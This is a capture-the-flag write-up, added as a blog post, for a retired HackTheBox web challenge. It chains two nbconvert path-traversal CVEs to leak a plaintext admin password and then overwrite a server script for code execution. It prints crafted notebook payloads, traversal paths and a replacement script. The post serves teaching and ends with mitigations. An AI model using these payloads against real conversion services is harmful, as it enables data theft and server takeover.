@@ -1,0 +1,172 @@
+---
+title: "HTB Web | Notebook Converter Pro: two CVEs, one flag"
+description: "A Jupyter notebook conversion service running a vulnerable nbconvert. Neither CVE alone gets the flag."
+date: 2026-05-15
+tags: [ctf, web, python, cve, lfi, rce, nbconvert]
+platform: HackTheBox
+category: Web
+retired: true
+draft: false
+---
+
+## Overview
+
+**Platform:** HackTheBox  
+**Category:** Web  
+**Difficulty:** Medium  
+**Status:** Retired
+
+Notebook Converter Pro is a Flask application that converts `.ipynb` files to HTML or Markdown using nbconvert. Users upload notebooks, pick a format, and download the result. An admin panel controls a setting that changes how Markdown exports handle generated assets. The flag requires chaining two separate CVEs in nbconvert, neither of which works in isolation.
+
+## Recon
+
+The source zip reveals the stack immediately: Flask, nbconvert 7.17.0, SQLite, gunicorn under supervisord. The Dockerfile tells the rest of the story:
+
+```dockerfile
+RUN mv /srv/app/flag.txt /root/flag.txt && \
+    chmod 600 /root/flag.txt && \
+    chown root:root /root/flag.txt && \
+    gcc -O2 /srv/app/readflag.c -o /readflag && \
+    chown root:root /readflag && \
+    chmod 4755 /readflag
+```
+
+The flag is in `/root/flag.txt`, readable only by root. `/readflag` is a SUID binary that reads it, executable by any user. The application runs as `appuser`. The path to the flag goes through `/readflag`.
+
+The admin password is generated at startup with `secrets.token_urlsafe(14)` and logged to stdout, which the supervisord config routes to the container's stdout. No log file, no way to read it from the outside.
+
+Checking the nbconvert version against known advisories turns up two CVEs reported by [g0blinResearch](https://github.com/g0blinResearch), who is also the challenge author, a good signal that both are intentional:
+
+- **CVE-2026-39378** ([GHSA-7jqv-fw35-gmx9](https://github.com/jupyter/nbconvert/security/advisories/GHSA-7jqv-fw35-gmx9)): arbitrary file read via path traversal in image references when `HTMLExporter.embed_images=True`
+- **CVE-2026-39377** ([GHSA-4c99-qj7h-p3vg](https://github.com/jupyter/nbconvert/security/advisories/GHSA-4c99-qj7h-p3vg)): arbitrary file write via path traversal in cell attachment filenames, exploitable through `ExtractAttachmentsPreprocessor`
+
+Both affect nbconvert `>= 6.5, < 7.17.1`. The application pins `nbconvert==7.17.0`.
+
+## Understanding the attack surface
+
+The conversion logic in `convert_job.py` runs as a subprocess for every job. Two exporters are configured:
+
+```python
+def convert_html(input_path, output_dir):
+    exporter = nbconvert.HTMLExporter()
+    exporter.embed_images = True
+    body, _resources = exporter.from_filename(str(input_path))
+    ...
+
+def convert_markdown(input_path, output_dir, storage_mode):
+    exporter = nbconvert.MarkdownExporter()
+    body, resources = exporter.from_filename(str(input_path))
+    if storage_mode == "saved_assets":
+        writer = FilesWriter(build_directory=str(output_dir))
+        writer.write(body, resources, notebook_name=input_path.stem)
+    ...
+```
+
+`embed_images = True` activates CVE-2026-39378. The `FilesWriter` path activates CVE-2026-39377, but only when `storage_mode == "saved_assets"`, which requires `asset_storage_enabled = 1` in the settings table, which only the admin can toggle.
+
+The admin password is not recoverable from the outside without reading the database. The database path is `/srv/app/data/app.db`. Passwords are stored in plaintext.
+
+## Phase 1: CVE-2026-39378, file read
+
+When `embed_images=True`, nbconvert processes image references in Markdown cells and embeds local files as base64 data URIs in the HTML output. The path resolution uses the notebook's directory as the base, set automatically by `from_filename`. There is no sanitization, so `../` sequences work.
+
+Notebooks are stored under `/srv/app/data/jobs/<job_id>/incoming/`. From there, the path to `app.db` is:
+
+```
+../../../../../../srv/app/data/app.db
+```
+
+The notebook to exfiltrate the database:
+
+```json
+{
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {},
+      "source": ["![x](../../../../../../srv/app/data/app.db)"]
+    }
+  ],
+  "metadata": {
+    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
+    "language_info": {"name": "python", "version": "3.11.0"}
+  },
+  "nbformat": 4,
+  "nbformat_minor": 5
+}
+```
+
+Upload and convert to **HTML**. The output contains the database embedded as a base64 data URI. Extract it and decode:
+
+```bash
+base64 -d b64.txt > app.db
+sqlite3 app.db "SELECT * FROM users"
+```
+
+Output:
+
+```
+1|admin|ylEFWGNaf_bPuPU3VnM|admin
+2|user|password|user
+```
+
+The admin password is in plaintext. Log in as admin, navigate to the Admin Panel, and enable "Save exported asset files."
+
+## Phase 2: CVE-2026-39377, file write
+
+With `asset_storage_enabled = 1`, Markdown conversions use `FilesWriter` to write attachment files extracted by `ExtractAttachmentsPreprocessor`. The preprocessor takes filenames directly from the notebook's attachment dict and passes them to `os.path.join` without sanitization. A filename like `../../../../../../srv/app/app/converter/convert_job.py` writes outside the job directory.
+
+`convert_job.py` is the right target: it runs as a fresh subprocess for every conversion, so the overwrite takes effect immediately on the next job.
+
+The attachment content is the replacement `convert_job.py`, base64-encoded and stored under the traversal path as the attachment key:
+
+```json
+{
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {},
+      "attachments": {
+        "../../../../../../srv/app/app/converter/convert_job.py": {
+          "text/plain": "<base64-encoded malicious convert_job.py>"
+        }
+      },
+      "source": ["![x](attachment:../../../../../../srv/app/app/converter/convert_job.py)"]
+    }
+  ],
+  "metadata": {
+    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
+    "language_info": {"name": "python", "version": "3.11.0"}
+  },
+  "nbformat": 4,
+  "nbformat_minor": 5
+}
+```
+
+The malicious `convert_job.py` executes `/readflag`, writes the output to a path the application will serve, and returns the expected JSON so the job completes normally:
+
+```python
+import subprocess
+import json
+from pathlib import Path
+
+result = subprocess.run(["/readflag"], capture_output=True, text=True, timeout=5)
+flag = result.stdout.strip()
+Path("/srv/app/data/flag.txt").write_text(flag)
+
+print(json.dumps({"status": "ok", "output_path": "/srv/app/data/flag.txt"}))
+```
+
+Upload and convert to **Markdown**. `FilesWriter` writes the malicious file to `/srv/app/app/converter/convert_job.py`.
+
+## Phase 3: trigger and retrieve
+
+Upload any notebook and convert to any format. The subprocess now runs the malicious `convert_job.py`, which executes `/readflag` and writes the flag to `/srv/app/data/flag.txt`. The job's recorded `output_path` points there, so the download button serves the flag directly.
+
+## Takeaway
+
+Three failures, one after the other. CVE-2026-39378 reads arbitrary files from the conversion host, which exposed the database. Passwords stored in plaintext meant the admin credential was immediately usable. With admin access, CVE-2026-39377 writes arbitrary files to the server, which overwrote the conversion subprocess and gave RCE.
+
+Each failure enabled the next. Patch the dependency and the database stays unreachable. Hash the passwords and a leaked database gives nothing. Isolate the conversion subprocess and an arbitrary write has no path to execution.
+
+None of these were exotic mitigations. The chain only existed because all three were skipped.
